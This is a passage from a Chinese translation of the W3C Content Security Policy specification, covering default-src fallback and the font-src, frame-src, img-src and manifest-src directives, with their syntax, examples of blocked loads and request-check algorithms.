                         <a data-link-type="dfn" href="#font-src" id="ref-for-font-src①">font-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self⑤">'self'</a>;
                         <a data-link-type="dfn" href="#frame-src" id="ref-for-frame-src">frame-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self⑥">'self'</a>;
                         <a data-link-type="dfn" href="#img-src" id="ref-for-img-src">img-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self⑦">'self'</a>;
                         <a data-link-type="dfn" href="#manifest-src" id="ref-for-manifest-src">manifest-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self⑧">'self'</a>;
                         <a data-link-type="dfn" href="#media-src" id="ref-for-media-src">media-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self⑨">'self'</a>;
                         <a data-link-type="dfn" href="#object-src" id="ref-for-object-src①">object-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①⓪">'self'</a>;
                         <a data-link-type="dfn" href="#script-src-elem" id="ref-for-script-src-elem">script-src-elem</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①①">'self'</a>;
                         <a data-link-type="dfn" href="#script-src-attr" id="ref-for-script-src-attr">script-src-attr</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①②">'self'</a>;
                         <a data-link-type="dfn" href="#style-src-elem" id="ref-for-style-src-elem">style-src-elem</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①③">'self'</a>;
                         <a data-link-type="dfn" href="#style-src-attr" id="ref-for-style-src-attr">style-src-attr</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①④">'self'</a>;
                         <a data-link-type="dfn" href="#worker-src" id="ref-for-worker-src">worker-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①⑤">'self'</a>
</pre>
                <p>也就是说，当设置了 <code>default-src</code> 时，所有未显式设置的 <a data-link-type="dfn" href="#fetch-directives"
                        id="ref-for-fetch-directives②">抓取指令</a> 都将回退到 <code>default-src</code> 指定的值。</p>
            </div>
            <div class="example" id="example-fae89c48">
                <a class="self-link" href="#example-fae89c48"></a> 没有继承关系。例如，如果显式指定了 <code>script-src</code> 指令，那么
                <code>default-src</code> 的值将不会影响脚本请求。也就是说，以下头部：
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy⑥">Content-Security-Policy</a>: <a data-link-type="dfn" href="#default-src" id="ref-for-default-src④">default-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①⑥">'self'</a>; <a data-link-type="dfn" href="#script-src-elem" id="ref-for-script-src-elem①">script-src-elem</a> https://example.com
</pre>
                <p>将与以下头部具有相同的行为：</p>
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy⑦">Content-Security-Policy</a>: <a data-link-type="dfn" href="#connect-src" id="ref-for-connect-src②">connect-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①⑦">'self'</a>;
                         <a data-link-type="dfn" href="#font-src" id="ref-for-font-src②">font-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①⑧">'self'</a>;
                         <a data-link-type="dfn" href="#frame-src" id="ref-for-frame-src①">frame-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①⑨">'self'</a>;
                         <a data-link-type="dfn" href="#img-src" id="ref-for-img-src①">img-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②⓪">'self'</a>;
                         <a data-link-type="dfn" href="#manifest-src" id="ref-for-manifest-src①">manifest-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②①">'self'</a>;
                         <a data-link-type="dfn" href="#media-src" id="ref-for-media-src①">media-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②②">'self'</a>;
                         <a data-link-type="dfn" href="#object-src" id="ref-for-object-src②">object-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②③">'self'</a>;
                         <a data-link-type="dfn" href="#script-src-elem" id="ref-for-script-src-elem②">script-src-elem</a> https://example.com;
                         <a data-link-type="dfn" href="#script-src-attr" id="ref-for-script-src-attr①">script-src-attr</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②④">'self'</a>;
                         <a data-link-type="dfn" href="#style-src-elem" id="ref-for-style-src-elem①">style-src-elem</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②⑤">'self'</a>;
                         <a data-link-type="dfn" href="#style-src-attr" id="ref-for-style-src-attr①">style-src-attr</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②⑥">'self'</a>;
                         <a data-link-type="dfn" href="#worker-src" id="ref-for-worker-src①">worker-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②⑦">'self'</a>
</pre>
                <p>鉴于这种行为，为网站构建策略的一个好方法是从 <code>default-src</code> 设置为 <code>'none'</code> 开始，然后逐步构建一套仅允许特定页面所需资源类型的策略。
                </p>
            </div>
            <h5 class="heading settled algorithm" data-algorithm="default-src Pre-request check" data-level="6.1.3.1"
                id="default-src-pre-request"><span class="secno">6.1.3.1. </span><span class="content">
                    <code>default-src</code> 预请求检查 </span><a class="self-link" href="#default-src-pre-request"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check④">预请求检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request②④">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object③③">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>default-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>返回执行 <a data-link-type="dfn" href="#directive-pre-request-check"
                            id="ref-for-directive-pre-request-check⑤">预请求检查</a> 的结果，其 <a data-link-type="dfn"
                            href="#directives" id="ref-for-directives②③">指令</a>的 <a data-link-type="dfn"
                            href="#directive-name" id="ref-for-directive-name①③">名称</a> 为 <var>name</var>，对
                        <var>request</var> 和 <var>policy</var> 进行比较，使用该指令的 <a data-link-type="dfn"
                            href="#directive-value" id="ref-for-directive-value①⑨">值</a> 进行比较。
                    </p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="default-src Post-request check" data-level="6.1.3.2"
                id="default-src-post-request"><span class="secno">6.1.3.2. </span><span class="content">
                    <code>default-src</code> 后请求检查 </span><a class="self-link" href="#default-src-post-request"></a>
            </h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check⑤">后请求检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request②⑤">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①②">响应</a>
                <var>response</var>，和一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object③④">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>default-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>返回执行 <a data-link-type="dfn" href="#directive-post-request-check"
                            id="ref-for-directive-post-request-check⑥">后请求检查</a> 的结果，其 <a data-link-type="dfn"
                            href="#directives" id="ref-for-directives②④">指令</a>的 <a data-link-type="dfn"
                            href="#directive-name" id="ref-for-directive-name①④">名称</a> 为 <var>name</var>，对
                        <var>request</var>、<var>response</var> 和 <var>policy</var> 进行比较，使用该指令的 <a data-link-type="dfn"
                            href="#directive-value" id="ref-for-directive-value②⓪">值</a> 进行比较。
                    </p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="default-src Inline Check" data-level="6.1.3.3"
                id="default-src-inline"><span class="secno">6.1.3.3. </span><span class="content">
                    <code>default-src</code> 内联检查 </span><a class="self-link" href="#default-src-inline"></a>
            </h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-inline-check" id="ref-for-directive-inline-check②">内联检查</a>
                算法如下：</p>
            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element②">元素</a></code>
                <var>element</var>，一个字符串 <var>type</var>，一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object③⑤">策略</a>
                <var>policy</var> 和一个字符串 <var>source</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-inline-check">§ 6.8.2 获取内联检查的有效指令</a> 对
                        <var>type</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>default-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>否则，返回执行 <a data-link-type="dfn" href="#directive-inline-check"
                            id="ref-for-directive-inline-check③">内联检查</a> 的结果，其 <a data-link-type="dfn"
                            href="#directives" id="ref-for-directives②⑤">指令</a>的 <a data-link-type="dfn"
                            href="#directive-name" id="ref-for-directive-name①⑤">名称</a> 为 <var>name</var>，对
                        <var>element</var>、<var>type</var>、<var>policy</var> 和 <var>source</var> 进行比较，使用该指令的 <a
                            data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②①">值</a> 进行比较。
                    </p>
            </ol>
            <h4 class="heading settled" data-level="6.1.4" id="directive-font-src"><span class="secno">6.1.4.
                </span><span class="content"><code>font-src</code></span><a class="self-link"
                    href="#directive-font-src"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="font-src">font-src</dfn> 指令限制可以加载字体资源的
                URL。该指令名称和值的语法由以下 ABNF 描述：</p>
            <pre>directive-name  = "font-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list③">serialized-source-list</a>
</pre>
            <div class="example" id="example-3d6c348e">
                <a class="self-link" href="#example-3d6c348e"></a> 给定一个具有以下内容安全策略的页面：
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy⑧">Content-Security-Policy</a>: <a data-link-type="dfn" href="#font-src" id="ref-for-font-src③">font-src</a> https://example.com/
</pre>
                <p>以下代码的获取将返回网络错误，因为提供的 URL 与 <code>font-src</code> 的<a data-link-type="dfn" href="#source-lists"
                        id="ref-for-source-lists④">源列表</a>不匹配：</p>


                <pre class="highlight"><c- p>&lt;</c-><c- f>style</c-><c- p>></c->
  <c- p>@</c-><c- k>font-face</c-> <c- p>{</c->
    <c- f>font-family</c-><c- o>:</c-> <c- u>"Example Font"</c-><c- o>;</c->
    <c- f>src</c-><c- o>:</c-> <c- f>url</c-><c- o>(</c-><c- u>"https://example.org/font"</c-><c- o>);</c->
  <c- p>}</c->
  <c- f>body</c-> <c- p>{</c->
    <c- k>font-family</c-><c- p>:</c-> <c- u>"Example Font"</c-><c- p>;</c->
  <c- p>}</c->
<c- p>&lt;/</c-><c- f>style</c-><c- p>></c->
</pre>
            </div>
            <h5 class="heading settled algorithm" data-algorithm="font-src Pre-request check" data-level="6.1.4.1"
                id="font-src-pre-request"><span class="secno">6.1.4.1. </span><span class="content">
                    <code>font-src</code> 预请求检查 </span><a class="self-link" href="#font-src-pre-request"></a>
            </h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check⑥">预请求检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request②⑥">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object③⑥">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>font-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-request-to-source-list">§ 6.7.2.5 请求是否匹配来源列表？</a> 对 <var>request</var>、该指令的
                        <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②②">值</a> 和
                        <var>policy</var> 的结果为 "<code>不匹配</code>"，则返回 "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="font-src Post-request check" data-level="6.1.4.2"
                id="font-src-post-request"><span class="secno">6.1.4.2. </span><span class="content">
                    <code>font-src</code> 请求后检查 </span><a class="self-link" href="#font-src-post-request"></a>
            </h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check⑦">请求后检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request②⑦">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①③">响应</a>
                <var>response</var>，和一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object③⑦">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>font-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-response-to-source-list">§ 6.7.2.6 请求的响应是否匹配来源列表？</a> 对
                        <var>response</var>、<var>request</var>、该指令的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value②③">值</a> 和 <var>policy</var> 的结果为 "<code>不匹配</code>"，则返回
                        "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h4 class="heading settled" data-level="6.1.5" id="directive-frame-src"><span class="secno">6.1.5.
                </span><span class="content"><code>frame-src</code></span><a class="self-link"
                    href="#directive-frame-src"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="frame-src">frame-src</dfn> 指令限制可加载到 <a
                    data-link-type="dfn"
                    href="https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable"
                    id="ref-for-child-navigable①">子导航</a> 的 URL。该指令名称和值的语法由以下 ABNF 描述：</p>
            <pre>directive-name  = "frame-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list④">serialized-source-list</a>
</pre>
            <div class="example" id="example-4f75856d">
                <a class="self-link" href="#example-4f75856d"></a> 给定一个包含以下内容安全策略的页面：
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy⑨">Content-Security-Policy</a>: <a data-link-type="dfn" href="#frame-src" id="ref-for-frame-src②">frame-src</a> https://example.com/
</pre>
                <p>以下代码的请求将返回网络错误，因为提供的 URL 与 <code>frame-src</code> 的 <a data-link-type="dfn" href="#source-lists"
                        id="ref-for-source-lists⑤">来源列表</a>不匹配：</p>
                <pre class="highlight"><c- p>&lt;</c-><c- f>iframe</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/"</c-><c- p>></c->
&lt;/<c- f>iframe</c-><c- p>></c->
</pre>
            </div>
            <h5 class="heading settled algorithm" data-algorithm="frame-src Pre-request check" data-level="6.1.5.1"
                id="frame-src-pre-request"><span class="secno">6.1.5.1. </span><span
                    class="content"><code>frame-src</code> 预请求检查 </span><a class="self-link"
                    href="#frame-src-pre-request"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check⑦">预请求检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request②⑧">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object③⑧">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>frame-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-request-to-source-list">§ 6.7.2.5 请求是否匹配来源列表？</a> 对 <var>request</var>、该指令的
                        <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②④">值</a> 和
                        <var>policy</var> 的结果为 "<code>不匹配</code>"，则返回 "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="frame-src Post-request check" data-level="6.1.5.2"
                id="frame-src-post-request"><span class="secno">6.1.5.2. </span><span
                    class="content"><code>frame-src</code> 请求后检查 </span><a class="self-link"
                    href="#frame-src-post-request"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check⑧">请求后检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request②⑨">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①④">响应</a>
                <var>response</var>，和一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object③⑨">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>frame-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-response-to-source-list">§ 6.7.2.6 请求的响应是否匹配来源列表？</a> 对
                        <var>response</var>、<var>request</var>、该指令的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value②⑤">值</a> 和 <var>policy</var> 的结果为 "<code>不匹配</code>"，则返回
                        "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h4 class="heading settled" data-level="6.1.6" id="directive-img-src"><span class="secno">6.1.6.
                </span><span class="content"><code>img-src</code></span><a class="self-link"
                    href="#directive-img-src"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="img-src">img-src</dfn> 指令限制加载图像资源的
                URL。该指令名称和值的语法由以下 ABNF 描述：</p>
            <pre>directive-name  = "img-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list⑤">serialized-source-list</a>
</pre>
            <p>该指令控制加载图像的 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request③⓪">请求</a>。更正式地说，这包括其 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request③①">请求</a> 的 <a
                    data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-destination"
                    id="ref-for-concept-request-destination⑥">目标</a> 为 "<code>image</code>" 的请求 <a
                    data-link-type="biblio" href="#biblio-fetch" title="Fetch Standard">[FETCH]</a>。</p>
            <div class="example" id="example-7fda6ee0">
                <a class="self-link" href="#example-7fda6ee0"></a> 给定一个包含以下内容安全策略的页面：
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①⓪">Content-Security-Policy</a>: <a data-link-type="dfn" href="#img-src" id="ref-for-img-src②">img-src</a> https://example.com/
</pre>
                <p>以下代码的请求将返回网络错误，因为提供的 URL 与 <code>img-src</code> 的 <a data-link-type="dfn" href="#source-lists"
                        id="ref-for-source-lists⑥">来源列表</a>不匹配：</p>
                <pre class="highlight"><c- p>&lt;</c-><c- f>img</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/img"</c-><c- p>></c->
</pre>
            </div>
            <h5 class="heading settled algorithm" data-algorithm="img-src Pre-request check" data-level="6.1.6.1"
                id="img-src-pre-request"><span class="secno">6.1.6.1. </span><span class="content"> <code>img-src</code>
                    预请求检查 </span><a class="self-link" href="#img-src-pre-request"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check⑧">预请求检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request③②">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object④⓪">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>img-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-request-to-source-list">§ 6.7.2.5 请求是否匹配来源列表？</a> 对 <var>request</var>、该指令的
                        <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②⑥">值</a> 和
                        <var>policy</var> 的结果为 "<code>不匹配</code>"，则返回 "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="img-src Post-request check" data-level="6.1.6.2"
                id="img-src-post-request"><span class="secno">6.1.6.2. </span><span class="content"><code>img-src</code>
                    请求后检查 </span><a class="self-link" href="#img-src-post-request"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check⑨">请求后检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request③③">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⑤">响应</a>
                <var>response</var>，和一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object④①">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>img-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-response-to-source-list">§ 6.7.2.6 请求的响应是否匹配来源列表？</a> 对
                        <var>response</var>、<var>request</var>、该指令的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value②⑦">值</a> 和 <var>policy</var> 的结果为 "<code>不匹配</code>"，则返回
                        "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h4 class="heading settled" data-level="6.1.7" id="directive-manifest-src"><span class="secno">6.1.7.
                </span><span class="content"><code>manifest-src</code></span><a class="self-link"
                    href="#directive-manifest-src"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="manifest-src">manifest-src</dfn> 指令限制从哪个 URL
                加载应用程序清单 <a data-link-type="biblio" href="#biblio-appmanifest"
                    title="Web 应用程序清单">[APPMANIFEST]</a>。该指令名称和值的语法由以下 ABNF 描述：</p>
            <pre>directive-name  = "manifest-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list⑥">serialized-source-list</a>
</pre>
            <div class="example" id="example-49db23b1">
                <a class="self-link" href="#example-49db23b1"></a> 给定一个包含以下内容安全策略的页面：
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①①">Content-Security-Policy</a>: <a data-link-type="dfn" href="#manifest-src" id="ref-for-manifest-src②">manifest-src</a> https://example.com/
</pre>
                <p>以下代码的请求将返回网络错误，因为提供的 URL 与 <code>manifest-src</code> 的 <a data-link-type="dfn" href="#source-lists"
                        id="ref-for-source-lists⑦">来源列表</a>不匹配：</p>
                <pre class="highlight"><c- p>&lt;</c-><c- f>link</c-> <c- e>rel</c-><c- o>=</c-><c- s>"manifest"</c-> <c- e>href</c-><c- o>=</c-><c- s>"https://example.org/manifest"</c-><c- p>></c->
</pre>
            </div>
            <h5 class="heading settled algorithm" data-algorithm="manifest-src Pre-request check" data-level="6.1.7.1"
                id="manifest-src-pre-request"><span class="secno">6.1.7.1. </span><span
                    class="content"><code>manifest-src</code> 预请求检查 </span><a class="self-link"
                    href="#manifest-src-pre-request"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check⑨">预请求检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request③④">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object④②">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>manifest-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-request-to-source-list">§ 6.7.2.5 请求是否匹配来源列表？</a> 对 <var>request</var>、该指令的
                        <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②⑧">值</a> 和
                        <var>policy</var> 的结果为 "<code>不匹配</code>"，则返回 "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="manifest-src Post-request check" data-level="6.1.7.2"
                id="manifest-src-post-request"><span class="secno">6.1.7.2. </span><span
                    class="content"><code>manifest-src</code> 请求后检查 </span><a class="self-link"
                    href="#manifest-src-post-request"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check①⓪">请求后检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request③⑤">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⑥">响应</a>
                <var>response</var>，和一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object④③">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>manifest-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-response-to-source-list">§ 6.7.2.6 请求的响应是否匹配来源列表？</a> 对
